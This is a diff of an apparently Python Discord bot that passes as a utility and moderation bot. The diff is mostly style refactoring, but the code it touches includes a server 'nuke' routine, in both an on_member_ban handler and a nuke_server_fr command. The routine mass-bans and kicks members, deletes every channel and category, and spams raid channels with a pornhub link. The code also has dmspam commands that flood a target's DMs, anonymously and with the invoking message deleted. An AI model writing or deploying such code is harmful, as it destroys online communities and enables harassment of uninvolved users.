@@ -200,7 +200,7 @@ You were AFK for {afklen}""")
             try:
                 await message.author.edit(nick=message.author.display_name.removeprefix("[AFK] "))
             except:
-                None
+                pass
             
             await asyncio.sleep(7.5)
             await welcomebackmsg.delete()
@@ -396,13 +396,13 @@ async def on_member_ban(guild, user):
                 try:
                     await member.ban(reason=random.choice(rlist))
                 except:
-                    None
+                    pass
             
             for member in guild.members:
                 try:
                     await member.kick(reason=random.choice(krlist))
                 except:
-                    None
+                    pass
             
             try:
                 try:
@@ -415,17 +415,13 @@ async def on_member_ban(guild, user):
                         try:
                             await channel.delete()
                         except:
-                            None
+                            pass
                 
                 except:
-                    None
+                    pass
                 
-                finally:
-                    None
             except:
-                None
-            finally:
-                None
+                pass
             
             newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
             for i in range(64):
@@ -448,7 +444,7 @@ http://pornhub.com/**""")
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                 except:
-                    None
+                    pass
 
 
 # ANTI NUKE
@@ -630,7 +626,7 @@ async def nuke_server_fr(ctx):
                     for channel in text_channel_list:
                         await channel.delete()
                 except:
-                    None
+                    pass
         
         await nuke_channel_2(ctx)
 
@@ -652,14 +648,14 @@ async def nuke_server_fr(ctx):
                 try:
                     await member.ban(reason=random.choice(rlist))
                 except:
-                    None
+                    pass
         
         for member in ctx.guild.members:
             if member.id != ownerid:
                 try:
                     await member.kick(reason=random.choice(krlist))
                 except:
-                    None
+                    pass
         
         try:
             try:
@@ -672,23 +668,19 @@ async def nuke_server_fr(ctx):
                     try:
                         await channel.delete()
                     except:
-                        None
+                        pass
                 
                 for category in ctx.guild.categories:
                     try:
                         await category.delete()
                     except:
-                        None
+                        pass
             
             except:
-                None
+                pass
             
-            finally:
-                None
         except:
-            None
-        finally:
-            None
+            pass
         
         for role in ctx.guild.roles:
             try:
@@ -718,7 +710,7 @@ http://pornhub.com/**""")
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
             except:
-                None
+                pass
 
 
 # updated.
@@ -883,7 +875,7 @@ Number of times: {number_of_times2}
 
 
 @bot.command(name='dmspam', help="""Spams a certain message a certain number of times.""")
-async def spam(ctx, number_of_times, user: discord.Member, *, message):
+async def dmspam(ctx, number_of_times: int, user: discord.Member, *, message):
     optoutfile = open('optoutspam.txt', 'r')
     optoutlist = []
     for x in optoutfile:
@@ -896,14 +888,21 @@ async def spam(ctx, number_of_times, user: discord.Member, *, message):
     elif ctx.author in spam_ban:
         await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
     else:
-        number_of_times = int(number_of_times)
-        
         dmchannel = await user.create_dm()
-        
-        await ctx.channel.send(f"Task started by {ctx.author}...")
+
+        await ctx.message.delete()
+        msg1 = await ctx.channel.send(f"Task started by {ctx.author}...")
         
         for i in range(number_of_times):
-            await dmchannel.send(message)
+            try:
+                await dmchannel.send(message)
+            except:
+                await ctx.author.create_dm().send(
+                    f"""Your `dmspam` task failed because the target ({user}) DMs are closed.""")
+                await msg1.delete()
+                return -1
+        
+        await msg1.delete()
         
         number_of_times2 = str(number_of_times)
         
@@ -912,6 +911,7 @@ async def spam(ctx, number_of_times, user: discord.Member, *, message):
         **NOTE: The bot is not responsible for any of the messages sent above.**""")
         
         msg2 = f"""<@{ctx.author.id}>, task done!
+
 Message: {message}
 Number of times: {number_of_times2}
 User: {user}
@@ -921,21 +921,28 @@ Guild: {ctx.guild.name}"""
 
 
 @bot.command(name='dmspam_force', help="""Spams a certain message a certain number of times... Anonymously.""")
-async def spam(ctx, number_of_times, user: discord.Member, *, message):
+async def spam(ctx, number_of_times: int, user: discord.Member, *, message):
     if ctx.author.id != ownerid and not ctx.author.guild_permissions.administrator:
         await ctx.channel.send("Omg who are you trying to spam?! noob hacker lmao, go hack ur mom instead")
     elif ctx.author in spam_ban:
         await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
     else:
-        number_of_times = int(number_of_times)
         
         dmchannel = await user.create_dm()
         
-        await ctx.channel.send(f"Task started by Anonymous...")
-        
+        await ctx.message.delete()
+        msg1 = await ctx.channel.send(f"Task started by Anonymous...")
+
         for i in range(number_of_times):
-            await dmchannel.send(message)
+            try:
+                await dmchannel.send(message)
+            except:
+                await ctx.author.create_dm().send(
+                    f"""Your `dmspam` task failed because the target ({user}) DMs are closed.""")
+                await msg1.delete()
+                return -1
         
+        await msg1.delete()
         number_of_times2 = str(number_of_times)
         
         await dmchannel.send(f"""Information:
@@ -943,6 +950,7 @@ async def spam(ctx, number_of_times, user: discord.Member, *, message):
         **NOTE: The bot is not responsible for any of the messages sent above.**""")
         
         msg2 = f"""<@{ctx.author.id}>, task done!
+
 Message: {message}
 Number of times: {number_of_times2}
 User: {user}
@@ -952,7 +960,7 @@ Guild: {ctx.guild.name}"""
         await userdm.send(msg2)
 
 
-@bot.command(name='optout_spam', help="""Opts out of spam.""")
+@bot.command(name='optout_spam', help="""Opts out of spam.""", aliases=['optoutspam'])
 async def optoutspam(ctx):
     optoutlist2 = []
     
@@ -973,7 +981,7 @@ async def optoutspam(ctx):
         optoutfile3.close()
 
 
-@bot.command(name='optin_spam', help="""Opts in of spam [after opting out].""")
+@bot.command(name='optin_spam', help="""Opts in of spam [after opting out].""", aliases=['optinspam'])
 async def optinspam(ctx):
     optoutlist3 = []
     
@@ -1006,7 +1014,7 @@ async def lockall(ctx):
         await ctx.channel.send("Omg why are you trying to lock channels!")
     else:
         for channel in ctx.guild.text_channels:
-            if channel.overwrites_for(ctx.guild.default_role).send_messages == True:
+            if channel.overwrites_for(ctx.guild.default_role).send_messages:
                 await channel.set_permissions(ctx.guild.default_role, send_messages=False,
                                               reason=f'User {ctx.author} used command lockall')
         
@@ -1306,7 +1314,7 @@ async def setafk(ctx, *, reason='AFK'):
     try:
         await ctx.author.edit(nick=f"[AFK] {ctx.author.display_name}")
     except:
-        None
+        pass
 
 
 @bot.command(name='about', help='Version and developer info.', aliases=['version', 'info'])
@@ -1769,7 +1777,7 @@ async def invites(ctx, person=None):
     if person is not None:
         try:
             personid = person.removeprefix("<@").removesuffix(">")
-            person = bot.get_user(id=int(personid))
+            person = bot.get_user(int(personid))
         except:
             await ctx.reply("I can't find that user.")
     
@@ -1780,10 +1788,10 @@ async def invites(ctx, person=None):
     if person.id != ctx.author.id:
         try:
             personid = person.removeprefix("<@").removesuffix(">")
-            member = bot.get_user(id=int(personid))
+            member = bot.get_user(int(personid))
         except:
             try:
-                member = bot.get_user(id=int(person))
+                member = bot.get_user(int(person))
             except:
                 await ctx.reply("I can't find that user.")
     
@@ -1981,7 +1989,7 @@ async def whois(ctx, person: discord.Member):
         mrolestr += f"<@&{str(i)}> "
     
     for i in mperms:
-        if i[1] == True:
+        if i[1]:
             mpermstr += f"`{i[0]}` "
     
     embed = discord.Embed(title=f"**User info for {mname}#{mdiscrim}**", description=f"""User: {person.mention}
@@ -2640,7 +2648,7 @@ async def rerollc(ctx, id_: int):
     try:
         users.pop(users.index(new_msg.author))
     except:
-        None
+        pass
     
     winner = random.choice(users)
     
